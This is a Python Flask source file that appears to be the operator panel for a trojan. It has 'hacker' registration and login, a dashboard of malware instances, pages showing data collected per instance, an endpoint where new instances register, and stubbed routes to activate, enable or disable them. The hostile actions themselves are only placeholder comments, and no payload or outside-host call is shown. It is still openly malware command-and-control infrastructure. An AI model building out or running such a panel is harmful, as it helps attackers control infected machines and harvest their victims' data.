from flask import Flask, redirect, request, render_template, url_for, jsonify
from werkzeug.security import check_password_hash
from sqlalchemy.orm import sessionmaker
from sqlalchemy import create_engine
import os

# Import your controllers and models
from userController import HackerController
from malwareController import MalwareController
from model import Hacker, Data, Malware

# Create Flask application instance
app = Flask(__name__, static_folder='static')

# Set up the database
dbPath = os.path.abspath('trojan2.db')  # Ensure this points to the correct database file
engine = create_engine(f'sqlite:///{dbPath}')
Session = sessionmaker(bind=engine)

# Initialize controllers
hacker_controller = HackerController()
malware_controller = MalwareController()

@app.route('/', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        name = request.form.get('name')
        email = request.form.get('email')
        password = request.form.get('password')
        
        # Register the hacker
        result = hacker_controller.registerController(name, email, password)

        # Check registration result
        if isinstance(result, dict) and result.get("status") == "success":
            return redirect(url_for('login'))  # Redirect to login page after successful registration
        else:
            return render_template("Frontend/register.html", error=result.get("message"))           
     
    return render_template('Frontend/register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form['email']
        password = request.form['password']

        try:
            # Create a new session for the login attempt
            session = Session()

            # Query the database for the user
            hacker = session.query(Hacker).filter_by(email=email).first()

            if hacker:
                result = hacker_controller.loginController(email=email, password=password)

                if result.get("success"):
                    return redirect(url_for('dashboard', values=email))
                else:
                    return render_template('Frontend/login.html', error=result.get("error"))
            else:
                return render_template('Frontend/login.html', error="User not found")
        
        except Exception as e:
            print(f"An error occurred: {e}")
            return render_template('Frontend/login.html', error="An error occurred. Please try again.")
        finally:
            session.close()  # Close the session after the operation
    
    return render_template('Frontend/login.html')

@app.route('/malware_dashboard')
def dashboard():
    malwares = malware_controller.read_malware_records()
    print(f'malwares from database: {malwares}')
    rows = malwares if malwares else []
    return render_template('Frontend/Dashboard.html', malwares=rows)

@app.route('/malware_details/<instance_id>')
def display_malware_details(instance_id):
    data = Data.read()
    if data is None:
        data = []

    malware = malware_controller.read_one(instance_id=instance_id)
    row = malware if malware else []
    return render_template('Frontend/Malware_details.html', malware=row, data=data)

@app.route('/register_malware', methods=['POST'])
def register_malware():
    result = malware_controller.create_malware_record()
    return jsonify(result)

@app.route('/activate/<instance_id>', methods=['POST'])
def activate_malware(instance_id):
    # Logic to activate malware instance
    return redirect(url_for('dashboard'))

@app.route('/enable/<instance_id>', methods=['POST'])
def enable_malware(instance_id):
    # Logic to enable malware instance
    return redirect(url_for('dashboard'))

@app.route('/disable/<instance_id>', methods=['POST'])
def disable_malware(instance_id):
    # Logic to disable malware instance
    return redirect(url_for('dashboard'))

if __name__ == '__main__':
    app.run(debug=True)